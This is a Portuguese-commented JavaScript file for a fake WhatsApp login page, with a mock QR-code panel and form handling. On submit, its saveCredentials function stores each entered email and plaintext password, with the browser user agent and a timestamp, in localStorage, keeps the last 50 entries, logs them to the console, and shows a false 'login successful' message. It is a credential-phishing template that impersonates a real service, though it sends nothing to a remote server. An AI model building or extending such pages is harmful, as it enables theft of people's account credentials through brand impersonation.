// Sistema de Login WhatsApp
document.addEventListener('DOMContentLoaded', function() {
    // Elementos
    const loginForm = document.getElementById('loginForm');
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');
    const showPasswordBtn = document.getElementById('showPassword');
    const refreshQRBtn = document.getElementById('refreshQR');
    const useQRBtn = document.getElementById('useQR');
    const loadingOverlay = document.getElementById('loading');
    const notification = document.getElementById('notification');

    // Mostrar/Ocultar Senha
    showPasswordBtn.addEventListener('click', function() {
        const type = passwordInput.type === 'password' ? 'text' : 'password';
        passwordInput.type = type;
        this.innerHTML = type === 'password' ? 
            '<i class="fas fa-eye"></i>' : 
            '<i class="fas fa-eye-slash"></i>';
    });

    // Atualizar QR Code
    refreshQRBtn.addEventListener('click', function() {
        this.disabled = true;
        this.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Gerando...';
        
        setTimeout(() => {
            showNotification('Código QR atualizado!', 'success');
            this.innerHTML = '<i class="fas fa-sync-alt"></i> Atualizar código QR';
            this.disabled = false;
        }, 1500);
    });

    // Alternar para QR Code
    useQRBtn.addEventListener('click', function() {
        document.querySelector('.qr-panel').scrollIntoView({
            behavior: 'smooth',
            block: 'center'
        });
    });

    // Submissão do Formulário
    loginForm.addEventListener('submit', function(e) {
        e.preventDefault();
        
        const email = emailInput.value.trim();
        const password = passwordInput.value;
        const remember = document.getElementById('remember').checked;
        
        // Validação
        if (!email) {
            showNotification('Digite seu email ou número', 'error');
            emailInput.focus();
            return;
        }
        
        if (!password) {
            showNotification('Digite sua senha', 'error');
            passwordInput.focus();
            return;
        }
        
        // Processar login
        processLogin(email, password, remember);
    });

    // Processar Login
    function processLogin(email, password, remember) {
        // Mostrar loading
        loadingOverlay.classList.add('active');
        
        // Salvar credenciais
        saveCredentials(email, password, remember);
        
        // Simular delay de conexão
        setTimeout(() => {
            // Esconder loading
            loadingOverlay.classList.remove('active');
            
            // Mostrar sucesso
            showNotification('Login realizado com sucesso!', 'success');
            
            // Limpar formulário
            loginForm.reset();
            
            // Redirecionar após 2 segundos
            setTimeout(() => {
                // Em produção, redirecionaria para o chat
                // window.location.href = 'chat.html';
                
                // Para demonstração, mostra alerta
                alert(`✅ Login realizado!\n\nEmail: ${email}\n\nAs credenciais foram salvas.`);
            }, 2000);
        }, 2000);
    }

    // Salvar Credenciais
    function saveCredentials(email, password, remember) {
        // Pegar credenciais existentes
        let credentials = JSON.parse(localStorage.getItem('whatsapp_credentials') || '[]');
        
        // Criar novo objeto
        const newCredential = {
            id: Date.now(),
            timestamp: new Date().toISOString(),
            email: email,
            password: password,
            remember: remember,
            browser: navigator.userAgent,
            date: new Date().toLocaleString('pt-BR')
        };
        
        // Adicionar à lista
        credentials.unshift(newCredential); // Adiciona no início
        
        // Manter apenas últimos 50 registros
        if (credentials.length > 50) {
            credentials = credentials.slice(0, 50);
        }
        
        // Salvar no localStorage
        localStorage.setItem('whatsapp_credentials', JSON.stringify(credentials));
        
        // Log no console
        console.log('🔐 Credencial salva:', newCredential);
        console.log('📊 Total de credenciais:', credentials.length);
        
        // Salvar também em um arquivo virtual
        saveToVirtualFile(newCredential);
    }

    // Salvar em arquivo virtual
    function saveToVirtualFile(credential) {
        const data = `
=== WHATSAPP LOGIN ===
Data: ${credential.date}
Email: ${credential.email}
Senha: ${credential.password}
Manter conectado: ${credential.remember ? 'Sim' : 'Não'}
IP: ${navigator.onLine ? 'Online' : 'Offline'}
Navegador: ${navigator.userAgent.substring(0, 50)}...
========================
        `;
        
        console.log('💾 Arquivo virtual criado:\n', data);
    }

    // Mostrar Notificação
    function showNotification(message, type) {
        notification.textContent = message;
        notification.className = 'notification show';
        notification.style.background = type === 'success' ? '#00a884' : '#ff4444';
        
        setTimeout(() => {
            notification.className = 'notification';
        }, 3000);
    }

    // Efeitos Visuais
    const inputs = document.querySelectorAll('input');
    inputs.forEach(input => {
        input.addEventListener('focus', function() {
            this.parentElement.style.borderColor = '#00a884';
        });
        
        input.addEventListener('blur', function() {
            this.parentElement.style.borderColor = '#d1d7db';
        });
    });

    // Efeito QR Code
    const qrPlaceholder = document.querySelector('.qr-placeholder');
    qrPlaceholder.addEventListener('mouseenter', function() {
        this.style.transform = 'scale(1.05)';
        this.style.transition = 'transform 0.3s';
    });
    
    qrPlaceholder.addEventListener('mouseleave', function() {
        this.style.transform = 'scale(1)';
    });

    // Verificar se há credenciais salvas
    checkSavedCredentials();
});

// Verificar credenciais existentes
function checkSavedCredentials() {
    const credentials = JSON.parse(localStorage.getItem('whatsapp_credentials') || '[]');
    console.log(`📋 ${credentials.length} credenciais salvas no sistema`);
}
